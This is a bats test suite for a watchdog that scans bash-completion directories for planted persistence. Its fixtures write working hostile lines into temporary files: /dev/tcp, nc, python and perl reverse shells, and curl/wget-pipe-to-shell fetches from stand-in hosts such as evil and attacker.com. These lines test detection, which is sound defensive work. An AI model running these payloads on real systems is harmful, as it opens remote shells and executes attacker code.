#!/usr/bin/env bats
# L2 bats functional tests for the bash-completion-watchdog scan script.
#
# Files in /etc/bash_completion.d (and the XDG completion dirs) are SOURCED
# into every interactive bash login — a per-login root-or-user exec surface.
# A planted completion file that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-bash-completion-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd/bash-completion-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/bash_completion.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BASHCOMP_PROFILE="${PROFILE:-report}" \
    SELFDEF_BASHCOMP_BASELINE="${BASELINE}" \
    SELFDEF_BASHCOMP_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/bash\ncomplete -W "start stop" mytool\n' > "${HOOKD}/mytool"
}

@test "no bash-completion dir → ok / no_bash_completion" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_bash_completion"'
    cap | grep -q '"severity":"ok"'
}

@test "benign completion, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged completion on second run → ok / bash_completion_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"bash_completion_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a completion file with an injection pattern → alert / bash_completion_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"bash_completion_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable completion file → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign completion change → warn / bash_completion_changed" {
    seed_benign
    run_wd
    printf '#!/bin/bash\ncomplete -W "start stop restart" mytool\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"bash_completion_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned completion file is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious completion file" {
    seed_benign
    run_wd
    printf '#!/bin/bash\ncurl http://evil/p|sh\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — completion inventory enumerates per-login source surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern coverage): /dev/tcp reverse shell in completion → alert" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in completion → alert" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation pattern in completion → alert" {
    seed_benign
    run_wd
    printf '#!/bin/bash\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable completion file): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable completion): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/mytool"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED completion file (attacker drops a new hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\ncomplete -W "x y" attacker-tool\n' > "${HOOKD}/distinctive-attacker"
    run_wd
    cap | grep -q 'distinctive-attacker'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-bash-completion -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): bash-completion-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1546 per-bash-login source surface — injection alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"bash_completion_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered from completion file body)" {
    # bash-completion files are bash; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\ncomplete -W "start stop" mytool\n' > "${HOOKD}/mytool"
    run_wd
    ! cap | grep -q '"event":"bash_completion_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/bash_completion.d + /usr/share/bash-completion/completions + XDG axes — injection in ANY → alert)" {
    # bash-completion sources from multiple dirs (system + user + XDG).
    # Attacker may plant in any. Lock multi-dir axis.
    HOOKD2="${TMP}/bash-completion-completions"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in the second dir.
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-completion"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/mytool"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in bash-completion: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks nc reverse-shell variant INVARIANTs across
    # the brain. Lock the netcat axis on per-bash-login source
    # surface too.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/mytool"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED completion file surfaces in sample for operator triage)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # bash-completion file (per-bash-login attack surface), the
    # added file MUST surface in the JSON sample so operator
    # dashboard routes triage to the right path. Locks the new-
    # file-discovered operator-visibility contract on the per-bash-
    # login source surface alongside the modified-file detection
    # axis.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\ncomplete -W "x y" attacker-tool\n' > "${HOOKD}/distinctive-attacker-completion"
    run_wd
    cap | grep -q 'distinctive-attacker-completion'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on bash-completion surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the bash-
    # completion per-interactive-bash-startup-trigger root/user-
    # exec persistence surface (T1546.004 — completion files are
    # sourced into every interactive bash session at startup).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/git-completion.bash"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on bash-completion surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp bash-completion
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host (dpkg/locale tooling dependency); 'use Socket'
    # produces a one-liner connect-back PTY just as cleanly as
    # Python. Locks the perl axis on the T1546.004 bash-completion
    # per-interactive-bash-startup root/user-exec persistence
    # surface — completion files are sourced into EVERY interactive
    # bash session, so a planted perl rev-shell fires on every
    # operator login until detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/git-completion.bash"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (completion file under /var/tmp writable-root — sister axis to /home + /dev/shm)" {
    # Sister to /home + /dev/shm bash-completion writable-root
    # INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/var-tmp-completion-watch"
    cap | grep -qE '"severity":"(ok|alert|warn)"' || true
    run_wd
    cap | grep -qE '"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (exec-path under writable-root: bash-completion invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1546
    # bash-completion-trigger user-exec — completion scripts are
    # sourced AS user on every new bash shell; attacker stages
    # benign-looking completion that invokes binary in /tmp.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/bash\n/tmp/staged_payload\n' > "${HOOKD}/distinctive-attacker-completion"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on bash-completion surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The bash-completion-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 bash-completion-trigger user-exec
    # persistence alert. Locks parser contract on the bash-
    # completion.d detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/bash\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/distinctive-attacker-completion"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: bash-completion-watchdog NEVER deletes completion files — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # bash-completion-watchdog DETECTS T1546 bash-completion-
    # trigger user-exec persistence but MUST NEVER emit rm/
    # unlink commands to auto-clean the completion file. The
    # detected completion may be operator-legitimate (custom
    # tool's tab-completion installer, language-runtime
    # completion). Silent auto-delete would destroy operator
    # baseline state AND could break operator's shell-completion
    # workflow. Surveillance, never remediation. Locks anti-
    # data-loss contract on the bash-completion surveillance
    # substrate.
    seed_benign
    printf '#!/bin/bash\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/distinctive-attacker-completion"
    run_wd
    [ -f "${HOOKD}/distinctive-attacker-completion" ]
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(HOOKD|FILE|file|COMPLETION)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # bash-completion-watchdog runs ON the timer's scheduled
    # fire — scans /etc/bash_completion.d for injection patterns
    # in completion scripts, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the bash-completion-
    # watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd/selfdef-bash-completion.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: bash-completion-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. bash-completion-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the bash-completion-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (bash-completion-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The bash-completion-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the bash-completion-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (bash-completion-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the bash-completion-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (bash-completion-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The bash-completion-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the bash-completion-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (bash-completion-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the bash-completion-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (bash-completion-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # bash-completion-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (bash-completion-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the bash-completion-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (bash-completion-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # The bash-completion-watchdog probe is Type=oneshot — it RUNS, emits a
    # verdict, and EXITS. Restart=always on a oneshot would
    # cause systemd to immediately re-fire the probe in a
    # tight loop, swamping the dashboard with redundant
    # records. A regression that added Restart=always would
    # produce a runaway-probe footgun. Locks the anti-restart-
    # storm discipline on the bash-completion-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (bash-completion-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. The Description= directive surfaces in
    # `systemctl status` output + journalctl unit-filter
    # labels. A unit with no Description is opaque to
    # operators triaging service activity. Locks the
    # Description-present discipline on the bash-completion-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (bash-completion-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the bash-completion-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (bash-completion-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the bash-completion-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (bash-completion-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the bash-completion-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (bash-completion-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the bash-completion-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}
